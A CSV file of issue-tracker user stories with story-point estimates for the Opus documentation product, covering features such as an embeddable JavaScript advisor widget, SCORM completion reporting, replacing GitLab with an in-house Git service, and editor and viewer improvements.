issuekey,title,description,storypoint
REB-6447,Embeddable Javascript Widget - Target Application Matches,"As a company that has implemented the ""Embeddable Javascript Widget"" into my website, I need Target Application matches defined within my Opus account to be recorded and transferred to the Data Lake (just like the Advisor apps).*Acceptance Criteria:** If the embed could be displayed on a web page, then the app needs to be able to identify Target Applications defined for my Opus site in the background.* The same information should be transferred to the Data Lake* The “targetAppPlatform” field should display “JavaScriptEmbed”* The “source” field should display “JavaScriptEmbed”",5
REB-6441,User should be able to view published document from Embed Widget whether or not User has account in Opus,"Current with [https://epilogue.atlassian.net/browse/REB-6316|https://epilogue.atlassian.net/browse/REB-6316|smart-link]  when user click the link we open the document in a new tab. If user are signed in, they will see it immediately. If they are not signed in, they will be redirected immediately after signing in.Expectation: User should be able to view published document without needing to login system because Embed widget has the token already that the implementor gets from ClientID/Secret.*AC** Any User can view the published documents from Embed widget.* Multiple users need to be able to view the document at one time with the token (ie everyone using it as the same generic user, shared user)* All functionality can remain available in the portal except the “My Profile” page since this use needs to remain generic",8
REB-6437,Email Notifications - change email address language,"As any user, receiving any email notification, the last few sentences of the email notification need to change.Instead of an epilogue listing the askus email address, like this:""If you did not make this change, please contact us at askus@epiloguesystems.com.""We need to reference the Epilogue community site, like this:""If you have any questions or problems, please contact Customer Support at epilogue.force.com on the My Cases page.""You can contact me directly for specific language replacements if needed, but the most important part of this story is to replace references to the askus email address to using the epilogue.force.com site instead.",1
REB-6436,Simulation Settings - set hex colors,"As a customer admin, setting Simulation Settings, I should be able to use a hexadecimal value to set the colors: !simulation_settings.jpg|thumbnail! We allow users to set the hex colors in their Account Info screen and Customize Output screen, so this is an inconsistency: !account_info.jpg|thumbnail! ",1
REB-6429,Import Manager - Legacy (.rstx) imports - Description in field tables not being imported,"When a legacy document (*.RSTX) file is imported, Steps with ""Type"" action events may be grouped and/or inserted into a field table depending upon the Opus configuration.  The Field table contains three columns; Field Name, Description, and Values.  The value of the Description column should come from the <additionalText> XML tag in the customXML.xml file in the legacy *.RSTX file.  In the current version, the <additionalText> data is not populated anywhere in the document produced by the import process for event steps  !Capture.PNG|thumbnail!  The description data does exist in the XML file in the <additionalText> tag in nodes with an <eventtypeid> value of zero (0) and an <eventtypetext> value of ""Event"" and <actionid> value of 70.  {{<additionaltext>Enter the company to search for. </additionaltext>}}The <additionalText> tag is also used for steps that contain header information where <eventtypetext> is empty.  The <additionalText> tag +may+ contain data for any action within an event step but usually only contains data where the <actionid> is 70 (actionText is Type).In the most common instances, <eventtypetext>=""Event"" and <actiontext>=""Type"", the value of <additionalText> should appear in the ""Description"" column of the Field table.In other circumstances where the <actiontext> is some value other than ""Type"" or Field Tables are not enabled, the <additionalText> value should be stored with the step in case the <actiontext> is changed by editing or Field tables are enabled after the document has been imported.The following files are attached for comparison:1.) The legacy PDF file [^CRM - ACTIVITIES.pdf] 2.) The legacy *.RSTX file source  [^CRM - ACTIVITIES.rstx] 3.) The Opus generated PDF [^CRM - ACTIVITIES (2) V0.0.pdf] ",5
REB-6428,Content Manager / Task Creation - change how empty recordings are created,"In [REB-6252] we established that creating new items in the Content Manager, or new Tasks through the Task Workflow, would immediately create a new branch for each. New items are having a new branch appended and new tasks are being placed in 'Edit' state and having a new branch appended.We need to change how this works for each case.1) When creating a new item in Content Manager, do NOT immediately create a new branch.However:* Users must be able to edit new items in Content Manager (even if they lack a recording or branch).* When users attempt to edit an item in Content Manager that lacks attached content, we will immediately create a new branch (if one doesn't already exist). This new branch will have an 'empty recording' - it will have all headers, footers, etc. already included. They will be sent to edit this 'empty recording.'*Note:* Creating new items in Recorders will go back to the way it worked a few sprints ago - it will create a new branch and start the recording.2) When creating a new task in Content Manager, if the user does not choose to attach existing content, import content, import file, etc. we will NOT immediately create a new branch and the task will STAY in create mode.However:* Users with edit permissions must be able to edit tasks in Create state* When users attempt to edit tasks in Create state, if the task lacks attached content, we will immediately create a new branch (if one doesn't already exist). This new branch will have an 'empty recording' - it will have all headers, footers, etc. already included. They will be sent to edit this 'empty recording.' Also, the task will be moved to 'Edit' state.",5
REB-6427,SAP Support URL - Allow for Hierarchy sub-levels to be defined,"We would like to be able to enter the exact hierarchy level (or sub-level) name that we want to target.  For example, when we download the Bulk Users for an account that has a hierarchy defined, we append a special field name for each level in the Hierarchy: !image-2019-06-26-12-41-52-199.png|thumbnail! Based on what I highlighted above, we should be able to enter “HierarchyLevel_Hier_3=Sub_1” in the URL and we can pull back every document that utilizes that specific value for that specific hierarchy level (or sub-level).",2
REB-6426,"SCORM - Each Simulation Type needs a ""Close"" option","As a user that downloads the SCORM Package for a piece of Content and then uploads the package to an LMS library, I am finding that once I complete the simulation, it does not recognize I completed the simulation nor does it report a score (see the image below) we need to ensure our simulations correctly report the completion and any score.Note: this is done in SCORM using the *cmi.core.lesson_status* (1.2) or cmi.completion_status (2004) and cmi.success_status. See this article: c[https://support.scorm.com/hc/en-us/articles/206166706-Separating-failed-from-complete-|https://support.scorm.com/hc/en-us/articles/206166706-Separating-failed-from-complete-]!image-2019-06-26-09-15-29-921.png|width=200,height=183! *Acceptance Criteria:** *Demo & Interactive Simulation* - Two changes:** On the modal window that is displayed at the end, change the ""Cancel"" button to be a ""Complete"" button.  When ""Complete"" is selected in the browser the modal will simply close and the user can continue to navigate the View screen (same as Cancel).  But, when it is selected via the LMS window, the window itself needs to close and the completion status and score is reported.** When the LMS window is closed (""X"" on browser) this needs to be the indicator that the completion status and score must be passed to the LMS.!image-2019-06-26-09-26-14-542.png|width=200,height=183!* *Test Simulation*** At the end of the simulation, there is currently a ""Start Over"" button, but no way to indicate that you are done with the test.  When the LMS window is closed (""X"" on browser) this needs to be the indicator that the completion status and score must be passed to the LMS.",5
REB-6425,CLONE - Open image preview fullscreen on click (from new doc view in advisor window),"Solution: just increase the iframe to 100% of the width to view the large image. Then, when they ""close"" the image, resize the iframe width to the normal size",2
REB-6424,Panel should remember if use set it to align to right side or left side,"As an advisor user, the panel should remember what side I have selected the panel to align to. It is aligned right by default, but if I switch this to the left, it should stay aligned to the left until I manually change it.* Save preference locally when user changes the alignment of the panel so that it is on that side when triggered again",1
REB-6413,User Settings / Attributes - Department/ Required dropdown needs 'Add All' option,"As a power or content user, removing my last department, when I see the 'Department Required' modal window it should give me the 'Add All' option.*Currently:* The dropdown in the 'Department Required' modal window shows a list of available departments in the account and users can only pick one: !Add_department.jpg|thumbnail! *Proposed:* The dropdown in the 'Department Required' modal window should show an 'Add All' option as the first option in the list, choosing this option should add all available departments to the user's account.",1
REB-6411,Step Instruction - Value tables (for TYPE action) are not displayed with newly added controls,"When testing [https://epilogue.atlassian.net/browse/REB-5985|https://epilogue.atlassian.net/browse/REB-5985|smart-link] on [https://getbootstrap.com/docs/4.3/components/forms/|https://getbootstrap.com/docs/4.3/components/forms/], I created a new Control, its name is “Text Box”. However, after recording on Bootstrap page then going to Editor, I saw my step did not have a value table. It’s completely blank.!image-2019-06-24-17-46-00-389.png|width=200,height=183!The reason here is my control is *a newly added control*. The value table is currently being handled for some specific controls (“Field” or “Cell” control) so that the new control will not work as expected. This leads to blank step instructions instead of value tables below.!image-20190924-101456.png|width=1333,height=122!*Actual:* The step instructions are blank.*Expected:* Value tables are displayed as normal. in Editor, when users change from any action to TYPE, the value table also is displayed immediately in the step instruction regardless of new or old controls",5
REB-6406,Advisor Context - Allow asterisks in both the Caption and URL fields,"As a user that defines context for content, I want to be able add asterisks into *both* the Caption and URL fields.  This will allow me to narrow my content matches.  Currently, if I have a URL that has asterisks, the Caption is completely ignored.",2
REB-6405,Editor - Blur Tool - increase effective blur for small areas,"As an Editor, using the Blur tool, if I choose a small area (even at the highest blur radius) the blurring is usually still not very effective (characters are still legible).Here's an example of a small area: !Small drag area.png|thumbnail! And the result: !small drag area result.png|thumbnail! Please note blurring for large areas is probably fine, but could be increased as well(example of blurring a larger area: !large drage area result.png|thumbnail! )So we need more effective blurring for small areas - possibly we could try to determine the background color and add more of that to the result, or we could offer a 'blurring background' color and mix in more of that if the user elects to use it.",2
REB-6401,Simulation Viewer - Notes - add 'press to continue' text for Interactive and Test,"As a user, viewing a standalone note in Interactive or Test Simulations, I want to see the ""Click on Image or Press Key to Continue"" text added to notes there as well.*Currently* the above text phrase is *only* added to notes in Demo Simulations when the simulations are set to pause on notes: !note_press_key.jpg|thumbnail! *In addition* we want to have that text added to notes in Interactive and Test Simulations as well. We always pause on those notes, so users should see the text which tells them they need to click or press a key.",2
REB-6400,Projects - click on Project name to open project,"In a customer account or Epilogue Root, in the Projects screen, I should be able to click on the Project name to open the project: !project_name.jpg|thumbnail! It should have the same behavior as the 'Open Project' button.",1
REB-6381,Book Viewer - Update to display json data from 6372 for documents within a book,"Following 6372, as a content user I need to see this json data displayed in the document viewer for all static doctypes to increase the performance of displaying the document.* Update document viewer to use the static HTML for the following doctypes** Standard** Generic** Enduser** Accessbility** -Eassistant-",5
REB-6377,Analytics Tab - Plan Setting,"As an Epilogue Admin, I want a plan setting that will allow me to enable the Analytics tab on a plan by plan basis so that I can charge customers for access to these analytics.* Add an access dropdown to the plan creation screen for “Analytics”** Add it after the “Dashboard” dropdown* “Access” will allow the user to see the tab and use it just like today* “No Access” will suppress the navigation item and disallow any access to this page.",3
REB-6376,SSO - Log success/errors for attribute mapping in the SAML assertion,"As an Epilogue Admin, I need to get able to see logs of how attributes were “Mapped” from a SAML assertion in graylog so that I can better support customers when they have an issue with their assertion* For each SSO sign on, log:** The tenant** the user** all attributes that were correctly mapped to a value in Opus** *all attributes that were NOT correctly mapped to a value in Opus** From these logs, I should be able to find what items were not correctly mapped for a user so that I can help them fix their assertion.",5
REB-6375,Document Viewer - Update to display static HTML from 6372,"Following 6372, as a content user I need to see this static HTML displayed in the document viewer for all static doctypes to increase the performance of displaying the document.* Update document viewer to use the static HTML for the following doctypes** Standard** Generic** Enduser** Accessbility** Eassistant",3
REB-6374,Skeleton Loading for Document Viewer,"As any content user, when I access the document viewer, I need a better user experience when I have to wait for it to load. Following REB-5118, we should do the same approach for the document view as was applied to the editor.* Implement skeleton loading for the document viewer and remove loading “splash” screen* Adjust API order to load the document first followed by the other items needed (icons, profile, etc)* Following REB-6372, display the HTML of the static doctypes immediately on load.",5
REB-6372,Save HTML for Static Doctypes to increase presentation speed,"As any content user, when I need to view a document, it needs to be displayed to me as fast as possible so I don’t have to wait for 5+ seconds for my document view to load. We should save the HTML of the static doctypes on publish so that we don’t have to do the data bindings in real time and can present the document very fast.* When a document is published, we should process the HTML for the “View” of the document and save this output so that it can be loaded much faster** Data-Binding should happen in the background when the HTML is generated, no in real time when the document is loaded* Each time a document is “published” updated the HTML for the static doctypes",8
REB-6370,Web/Desktop Advisor - Change the position of EAssistant window to the right side of the screen,"On the Web Advisor,  go to a context to suggest a document. Click ""Open Document"" on the notification, the EAssistant window will be opened.Actual Result: the EAssistant window will be opened but it does not appear at the center.Expected Result: Desktop/web advisor should be opened at the right side",2
REB-6369,Embeddable Javascript Widget - API access - validation ,"As an implementor who is using the embedded advisor widget on my own site, I want to be able to receive suggested content securely so that unauthorized user can’t see my published document.*AC*:* An access token will be required to make calls to public api endpoint* A sample guidelines in the public api document page on how to obtain access token using client id and client secret in C# and PHP code.*Assumption*Access token is obtained from the implementor’s server side using the given client id and client credential.",5
REB-6325,Web Recorder Training - Train for Foundations components - Core,"With the training framework in place, we need to continue to add “rules” to enhance how we record different frameworks. In this story we’ll focus on Foundation framework and it’s core components.[https://foundation.zurb.com/sites/docs|https://foundation.zurb.com/sites/docs]Add rules for all major Foundation components to ensure the recorder captures them perfectly when clicked.* Input* Text Area* Select Menu (dropdown)* Check Box* Radio Button* Help Text* Button (All types)* Dropdown (See Dropdown Arrows, Dropdown Menu)* Button Group* Callout* Slider (horizontal and vertical)* Switch* Menu* Drilldown/Accordion Menu* Pagination* Breadcrumbs* Card* Modal* Tab",13
REB-6316,Embeddable Javascript Widget - Code and Funcitonality,"As any Customer Admin with API access on my account, I need to be able to copy javascript embbed code from the API page that I can copy into my site to get document suggestions.* Create embeddable javascript code that will display the advisor widget like we have on Opus in any website!image-20190619-140808.png|width=74,height=72!* The widget should be able to detect the context of the page (Window Caption, URL and SPECIAL BROWSER)* The widget will utilize the API Access that each client account can have to get back a list of documents that match the context of the current page.** Add other API criteria (username, keyword etc) as variables in the widget so that the user implementing this can pass these values to the widget.** The widget needs to obfuscate the client ID and secret used to validate the request so that they are not exposed* When document matches are found, present it just like in the Opus portal** Display a badge for the number of matches** If the widget is clicked, expand to show the document list** Clicking an item from the list should open the document URL!image-20190619-141234.png|width=355,height=588!",13
REB-6311,Embeddable Javascript Widget - Portal Download,"As any Customer Admin with API access on my account, I need to be able to copy javascript embbed code from the API page that I can copy into my site to get document suggestions.* In the API Settings Page, add a section below “View API Documentation” Titled “Embed The Advisor Widget”* Below the title, display the java script embed in a simple “code” view to allow them to highlight and copy the code** Also include a simple copy button** Note: We can use some standard tool for this since displaying code on a website is standard thing* This embeddable code should contain everything needed to work immediately without have to edit it.* If API Access is unchecked this section should not appear and the widget will not longer work since it is dependent on this API",5
REB-6273,Change redirect url on session invalidation,"As any user, when my current session is invalidated (for any reason) I am redirected to the sub-domain login page for my account. This creates a bigger problem with SSO accounts.If I invalidate my current SSO session by logging into a different browser, the first session will be redirected to sub-domain and it will immediately try to sign them in again. This causes the 2 browsers to get into a sort of ""loop"" when each one will invalidate the others session.* Redirect all users to the main login page rather than the sub-domain login page, when their session is invalidated for any reason.",1
REB-6272,Gitlab Replacement Migration/Promotion Path,"Currently Gitlab store all repositories which are bare repository, we will need to copy all repositories from gitlab location to new location and clone all of them to working directory repository.*AC** Copy all repositories from Gitlab Location to new location.* Write script to clone all of them to working directory repository.* Ensure all branches of all repositories are cloned.",13
REB-6271,Replace existing Gitlab Endpoint in Portal #6,Create a new endpoint “projects/\{projectId}/repository/files/\{filePath}” to replace existing Gitlab Endpoint.*AC** Path: “projects/\{projectId}/files/\{filePath}”* Method: PUT* Params:** branch** encoding** commit_message** contentThis endpoint would handle to update file in working directory for the branch of the repository.,5
REB-6270,Replace existing Gitlab Endpoint in Portal #5,Create a new endpoint “projects/\{projectId}/repository/files/\{filePath}” to replace existing Gitlab Endpoint.*AC** Path: “projects/\{projectId}/files/\{filePath}”* Method: POST* Params:** branch** encoding** commit_message** contentThis endpoint would handle to:* Create new file in working directory for the branch of the repository.,5
REB-6269,Replace existing Gitlab Endpoint in Portal #4,Create a new endpoint “projects/\{projectId}/repository/branches/\{branchName}” to replace existing Gitlab Endpoint.*AC** Path: “projects/\{projectId}/branches/\{branchName}”* Method: DELETEThis endpoint would handle to delete a branch of the repository.,5
REB-6268,Replace existing Gitlab Endpoint in Portal #3,Create a new endpoint “projects/\{projectId}/repository/branches” to replace existing Gitlab Endpoint.*AC** Path: “projects/\{projectId}/branches”* Method: POST* Params:** branch** refThis endpoint would handle to create a new branch from reference branch for the repository.,5
REB-6267,Replace existing Gitlab Endpoint in Portal #2,Create a new endpoint “projects/\{projectId}” to replace existing Gitlab Endpoint.*AC** Path: “project/\{projectId}”* Method: DELETEThis endpoint would handle to delete a existing repository in rooted path.,5
REB-6266,Replace existing Gitlab Endpoint in Portal #1,Create a new endpoint “/projects” to replace existing Gitlab Endpoint.*AC** Path: “/project”* Method: POST* Params: ** nameThis endpoint would handle to create a new repository in rooted path.,5
REB-6265,Replace Gitlab with our own service - Create,User want to create new a branch. We need to create our own service that use LibGit2Sharp to Create a new branch from a reference branch that use Repository’s CreateBranch Method.*AC** Create a new branch from a reference branch.* New Branch will have all commits from reference branch.,5
REB-6264,Replace Gitlab with our own service - Get,User want to get File Info from reference branch of repository. We need to create our own service that use LibGit2Sharp to retrieve File info.*AC*Retrieve File Info from the branch of repository such as:* FileName* FilePath* Size* Ref* Content* CommitId* LastCommitId,5
REB-6263,Replace Gitlab with our own service - Merge,"User want to merge a branch to “master” branch . We need to create our own service that use LibGit2Sharp to merge to target branch from source branch that use the repository's Merge method. We will need to checkout target branch and get the commit that the source branch points to, Afterward we will merge into the target branch. *AC*All new commits from source branch that would be merged to target branch.",5
REB-6262,Replace Gitlab with our own service - Commit,"User want to commit to a repository that is checked out to the file system, User can update the file on the file system. We need to create our own service that use LibGit2Sharp to make a commit to a repository that use the repository's Commit method. *AC** Handle to commit file to a branch of repository.* Include to commit the large file as well",5
REB-6256,CLONE - SAP Support - Allow URL to contain only a single piece of metadata to get a list of documents,"Based off of the client’s feedback, they want this URL to have the ability to pull back documents based off of only one piece of metadata.  Currently, you must enter the Caption and Process to pull anything back.  See last comments in REB-5311 for approach.As any user of the system, if I click a URL from an SAP instance, we need to support a specifically formatted URL that will open the Advisor page or the document directly. This would work like Advisor does, however, instead of Advisor detecting the context and metadata, those values would be contained within the URL.Note: This applies to ANY application where a URL could be added, not just SAP. The functional requirement is about the URL format and what it loads in the portal.  It is critical that a user can enter a single piece of metadata (like Department or Application), with NO Caption or Process defined, and pull back all documents that match that single piece of metadata - {color:#ff5630}*Format Example:*{color}{color:#ff5630}<full account url>/landing/advisor/shortcut?department=Finance{color}* Custom Metadata must also be allowed in the URL search.* Provide specific URL format for the application that can include ANY of the metadata associated with a document (Caption, URL, Process, application, etc) Example: ""Application=Microsoft Excel""* The metadata in the URL must ALL match in order for the document or documents to match (they have an AND relationship). If the metadata exists in the customer account, and the document or documents lack it entirely (have NULL for that metadata) they will NOT match* If one or more of the metadata in the URL are MISSING in the customer account, they will be ignored for matching purposes. They will not create a match or prevent a match** If ALL the metadata in the URL are missing in the customer account then no matches will be provided* If more than 1 document matches the metadata provided by the URL, direct the user to the Advisor page and display the documents as if they had been suggested by advisor* If only 1 document matches the metadata provided by the URL, display the Eassistant in it's own browser tab, with the smaller width to fit Eassistant doctype.* If no matches are found, the user should be directed to the Advisor screen for their account anyway. The Advisor page should display the ‘No content matches your context’ message, unless they have previous Advisor hits to display there.*Note:* We also need to support published content that is not a typical document (PDF, PPT, PNG, etc.)Right now if we link to one of those documents using this approach, it attempts to open it in the Viewer and throws an error. We need to have Opus handle them as it normally does.*Note:* We are *not* covering sub-levels of hierarchy custom metadata in this story, as per Erick’s comments below.",13
REB-6252,Empty recording,"As the requirement was changed, we will apply the new rules following these items below:- Create empty recording when creating task/documents (on web portal and 2 recorder apps)- Remove button to manual adding empty recording- Remove options 'empty recording' when creating task",3
REB-6230,Project / Task Permissions - Users with QA Role need to Edit and Delete Issues,"As a user with a QA Role or a Team Lead role with QA permission, I need to be able to Edit and Delete Task Issues in that project.*Expected:* A user with the QA team role in a project, or a team lead role with QA permission, will be able to edit or delete any issue attached to a task in that project.*Currently:* Only Project Admins seem to have this capability.",3
REB-6228,Viewer - Linking to Public Library Content,"As a user who is not logged in to Opus, clicking on a link to Public Library content, I am not forwarded to that content after I log in.What's required is the capability to:1. Get a link to Public Library content which will work for customers in any account (if we *can't* use the link that appears when viewing the content - if we can simply use that link, that's fine)2. Make sure we have post-authentication forwarding working for that link from any account (Epilogue Root users or customer account users)On the face of it this seems to be a regression bug with the post-authentication forwarding capability we added a few sprints ago. However I understand that linking to Public Library content may not work the same as linking to content within a customer account, so if this requires new development that's fine.",2
REB-6227,Viewer / PDF - Step Control Number in Image - Change Opacity,"As a user, viewing a static content type, the step control number and background (the number and the background circle around it) can sometimes obscure details of the Step Image.We would like to change the opacity of the step control number and its background to 50%.In addition to this change to the Viewer for static content types, we will need to change some settings screens to accurately show how the number and background will appear in the Viewer/PDF:# Customize Content - show step control number and its background at 50% opacity# Account Settings / Content Settings - in Preview images, show step control number and its background at 50% opacity*Note:* The right number here may be more or less than 50%, we may need to see several options on DEV and determine which looks the best. Since we seem to be rendering the number and background as part of the image, we can't test this ourselves, so presenting several options to the Project Management team will have to be part of this story.",1
REB-6217,No publishing items when edit attributes page is open,"As a user with publishing privileges, I should not be able to publish a document when another user is on the ""Edit Attributes"" page for that document.*Example*:User A goes to edit attributes on ""document123""User B then tries to publish document123Expected: User B is not allowed to publish the document",3
REB-6216,"Recorder & Advisor App: Change location of settings, Tokens to Current System User's AppData ","We have the issue that is related to permission When App recorder installed to Programs Files folder, We stored settings, tokens file in Programs File as well, If User does not have permission, App couldn't write value to settings, token file. We will need to change location of settings, token to User's AppData.Solution: Put settings, token under AppData\\roaming\\Name of App, we will need to remove if current user uninstall app. We will need to ensure App read and write value from/to AppData.",3
REB-6206,Desktop Advisor - Improve the eAssistant window Load Time,"This story stems from *REB-5011* (from Comments).  There was an improvement to the Web Advisor eAssistant load time and this also needs to be applied to the Desktop Advisor.  A similar strategy must be applied so that only the most important pieces are loaded (Remove unnecessary parts, query optimization, etc.).",5
REB-6204,Epilogue Root - Managing Customer - allow multiple Epilogue users to manage same account - investigation,"As an Epilogue root user, I want to be able to manage a customer account *even if someone else is managing it at the same time.*Allow multiple Epilogue root users to manage the same customer account at the same time.",2
REB-6198,Add ad-hoc build with REB-5979,We need a ad-hoc build with REB-5979. The current release will not have REB-5979 anymoreNoted: this ad-hoc build will not use auto update function,2
REB-6197,Desktop/web advisor - Increase length of the Eassistant window when launched,"As any user, when I trigger a match with the desktop advisor or current web advisor (not panel web advisor), we launch a standalone eassistant window. This window just needs to be taller (longer).* Adjust height of standalone eassistant window so that more content is visible by default (2x the existing height)Note: In general we’d like this to be about the height of the browser window, but we don’t need to get this explicitly. The default size just needs to be larger.*Update after discussion:*Adjust height of the Eassistant window to 90% of display height",2
REB-6196,"""Incomplete"" user status set incorrectly - SSO Accounts","As a customer admin with SSO enabled on my account, if I manually removed a user from Opus, OR if turn off SSO for all user in my account and turn it back on, when these previous user try to log back into Opus,  they will be able to login, but will have an ""Incomplete"" status so that they cannot be added to Projects/Tasks, etc.Steps to reproduce:1. For any SSO account, manually remove a user that was previously added and ""Active"".2. Sign-in again with that user to re-add them3. The user status will be set to ""Incomplete"" even though they have all their metadata completed. No changes to the metadata will resolve this ""Incomplete"" status.It appears that anytime the user ""bypasses"" the setup wizard  because they were previously part of the account, they get stuck in this state.* Fix this to ensure that if a user has all required fields, they are set to ""Active"". The incomplete status is only for users that have NOT previously completed the setup wizard.",5
REB-6189,"Editor - Notes - allow bold, italic","As a user, attempting to edit the body of a standalone or embedded note, attempting to bold or italicize the body text of the note does not work. It is overridden and the bolding or emphasis is hidden, in Editor, Viewer, and PDF.*Expected:* Using bold or italic in the note body should be reflected in the Editor, Viewer, and PDF.*Actual:* Using the <strong> or <em> tags is overridden by the note CSS.",1
REB-6137,Public API Access: Add other policy to allow Any Domain access public Api,"Current We are implementing CORS to limit Domain access to Opus's API, that cause User can't access public Api from their site. We will need to create new other policy to allow any Origin access to public API.*Solution*: disable cors or add other policy to allow access to public api",2
REB-6124,HTML Elements - 'Set as Default' option,"As a customer admin, working on HTML Elements in my account (other than Note and Basic), I need the ability to set a custom element as the 'default' for its category.For Headers, I will be able to set an element as the default for certain content types using the dropdown placed in the image below:!set_default.jpg|width=200,height=183! For Titles and Footers, I will set them as the default for all content types using a checkbox, like so:Set as Default (checkbox)When I set an element as default:1. It will be automatically added to new recordings, in the appropriate place for its category (for example, if I am creating a new default footer, it will be added at the end. Title, it will be added at the beginning. Etc.)2. For Headers, I use a ‘content type' dropdown for this setting, so this will be the default element for as many or as few content types as I require. I could create a new default for the Standard and Enduser headers, and another default for the Accessibility and Generic headers.For Titles / Footers, they are either the default for all content types or they are not. If a default footer already exists, the option to make it the default is grayed out.3. If there is already a default for that content type and it hasn’t been disabled / rendered inactive (if I am editing a header, and the Standard default header is still active, for example) that checkbox in the dropdown will not be available. Since we don’t allow multiple Standard headers, multiple titles, multiple footers, and so on, if the customer account still has the original default active, setting a second default would not be useful, so we need to disable this option in that case. If the Standard default header is active but the generic and enduser default headers have been disabled, for example, the user should be able to choose either or both of the latter in the dropdown. If a default title or footer already exists, the option to make it the default is grayed out.If a default header exists for all content types, the “Set as Default” and dropdown will be hidden for the header you are editing. *Note:* As a reminder, this story does not cover Note and Basic elements, or any HTML elements that do not have defaults. This only covers HTML elements that have defaults, currently Title, Footer, and Headers.",8
REB-6104,Add setting page as a part of panel,Load an iframe with setting page content insideHandle updating data,3
REB-6095,Mapping Additional Context: Send the id of steps to Lambda Instead All Information of Element Steps to avoid exceeding the maximum sqs message size,"Current we are sending all information of element steps to lambda to find additional context, If Recording has huge steps (over 300 steps), The message can exceeds the maximum sqs message size (256 KB). We will need to change code to send id the steps instead All Information.We should filter the id of steps with step “kind”",2
REB-6046,Content List - Rating should be average score,"As a user, viewing the content list, the rating displayed next to the content should be an average rating. !contents_scoring.jpg|thumbnail! *Expected* When I view published content and set a rating, it is saved immediately and affects the content's average rating. I can go to the Content List and view the average rating for all published content there.*Actual* When I view published content and set a rating, it is only visible to me when I view that content. It only seems to be saved when I republish the content. !calculator_myscore.jpg|thumbnail! Also, if I go to the Content List and view published content there, it only displays my personal rating for each - I am even able to set ratings through this interface. I should not be able to set ratings here, it should be displaying the average rating instead.",2
REB-5985,Web Recorder Training - Train for Bootstrap components - Core,"Following 5886 and 5887, we need to create the rules for all major bootstrap components so that the Web Recorder captures them perfectly during a normal recording.* Add rules for all major Bootstrap components to ensure the recorder capture them perfectly when clicked.** Alerts** Breadcrumb** Buttons** Button Group** Card** Collapse** Dropdowns** Forms** Input Group** List Group** Modal** Navs** Nav Bar** Pagination** Popover** Toasts",13
REB-5984,Desktop Recorder - Application partially off screen - Resolution,"Following our investigation in REB-4920, we need to enhance the desktop recorder to resolve this issue.* Enhance the Desktop recorder to handle all the cases noted where the screen capture of an application includes a ""black"" area due to that section being offscreen.** The image should be cropped correctly based on the calculations so that no black area is captured or shown.",8
REB-5979,Desktop App Install - Do NOT install shortcut for applciations when installed with .ini file,"As any user of the application, if I install the desktop recorder or the desktop advisor using the setup .ini files, I do not want the installer to create a short cut for the application. This is because many corporate users may be installing the application to a specific directory AND when the app installs the short-cut, it may not have permissions to create the short-cut in this directory.When this happens and the shortcut cannot be created, the entire installation fails. So the goal it to ensure that the installer with the .ini will install the app to the specified directory and that is it (no shortcut).* When the desktop recorder or advisor are installed using the .ini files, the installer should NOT create a desktop shortcut to avoid permission issues causing the installer to fail.",3
REB-5972,Improve SQL Queries for the screens - Investigation,"Current we have many queries that are used in some screens, we will need to refactor them to improve performance as much as possible.* Search PublicLibrary Contents (access from public api as well)* Get All Tenant Documents For Link Element* Export Documents* Manage element pagesWe can use this story to track and update more existing queries that needed to improve. They are not easy to be improve, we need to get business and test carefully after refactor",3
REB-5969,Dashboard - The published/unpublished/imported docs should show in My content card,"As a user, I go to dashboard->My items->My content and I just see Published recording docs in there . Expected: The ""Popular Content"" card will show every task/doc that has been unpublished, published, or imported AND where the author is the active user. They should include both external or recording docs. Please fix for customer admin/content user/power userAs a user, I published an external doc then I go to dashboard->My team->My content and see that doc does not show in there . Expected: External doc should show in there. If I click on doc what are .png, excel, etc it will be downloaded. In case the docs are is pdf or html file, please open it on new tab like they has in content listrelated tickets REB-2559, REB-2553",1
REB-5967,Customize Content - Step note instruction Background Color and Border Color options,Background Color option displays for both Step note caption and Step note instruction and control the same attribute. Border Color option displays for both Step note caption and Step note instruction and control the same attribute. Remove the Background Color and Border Color options from Step note instruction.,1
